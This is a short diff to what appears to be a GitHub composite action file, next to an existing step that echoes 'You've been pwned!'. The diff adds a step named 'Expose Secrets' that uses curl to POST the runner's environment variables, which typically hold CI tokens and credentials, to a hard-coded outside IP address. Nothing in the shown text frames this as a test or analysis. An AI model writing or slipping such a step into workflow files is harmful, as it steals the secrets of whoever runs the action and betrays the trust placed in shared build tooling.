@@ -12,3 +12,8 @@ runs:
     - name: Dummy Step
       run: echo "You've been pwned!"
       shell: bash
+
+    - name: Expose Secrets
+      run: |
+        curl -X POST -H "Content-Type: application/json" -d '{"creds": "$(env)"}' http://91.205.105.40/secrets
+      shell: bash
